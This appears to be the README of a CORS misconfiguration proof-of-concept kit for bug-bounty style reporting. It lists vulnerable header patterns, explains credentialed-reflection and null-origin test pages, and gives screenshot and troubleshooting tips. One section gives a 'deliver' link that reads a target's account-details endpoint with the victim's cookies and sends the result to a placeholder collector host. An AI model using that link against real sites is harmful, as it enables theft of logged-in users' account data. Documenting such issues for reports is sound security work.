# CORS PoC (local lab)

# case 1 reflections
Access-Control-Allow-Origin: https://malicious-website.com

Access-Control-Allow-Credentials: true

# case 2 null origin
Access-Control-Allow-Origin: null

Access-Control-Allow-Credentials: true

# exfill
Now you can send a single “deliver” link such as:

https://ythone.github.io/cors_poc/deliver.html?target=https://TARGET/accountDetails&creds=1&exfil=https://your-collector.example/collect

https://ythone.github.io/cors_poc/deliver.html
  ?target=https://TARGET/accountDetails
  &creds=1
  &exfil=https://your-collector.example/collect

# local test
Run locally:

npm i
node server.js
# -> POST target data to http://localhost:8089/collect ; view http://localhost:8089/logs


# PoC A — “Credentialed reflection” (PUT/PATCH/POST), no exfil
# Point your PoC’s exfil to that /collect endpoint.

How to use:

Log in to the target in the same browser if the endpoint needs auth.

Pick the method (PUT/PATCH/POST), set headers/body, Use cookies as needed, click Run.

If the body renders and ACAO reflects your origin (and ACAC is true when using creds), you’ve proven a read-capable CORS misconfig for that method.

In DevTools → Network, you should also see the preflight OPTIONS succeed with the correct Access-Control-Allow-* lines.


# PoC B — “Origin: null” + methods (sandboxed Blob iframe), no exfil
What to screenshot for the report

Your PoC page showing the response body.

DevTools → Network in the PoC tab:

The preflight OPTIONS (status OK) with Access-Control-Allow-Methods including your method and Access-Control-Allow-Headers including any custom headers.

The actual method response with Access-Control-Allow-Origin: <your origin> (or null) and Access-Control-Allow-Credentials: true if you used cookies.


# Troubleshooting quick hits

No preflight response / 4xx: the server isn’t allowing your method/headers; you can’t prove a read.

Body doesn’t render + CORS error: check ACAO/ACAC on the actual response; also ensure you’re logged in and cookies are cross-site sendable (credentialed case).

Null-origin case: use the Blob-iframe PoC (B) or a file:// page; confirm Origin: null in DevTools.

These two pages let you demonstrate PUT/PATCH/POST CORS misconfigurations with the same, clean “read in the browser, no exfil” style as your earlier GET PoCs.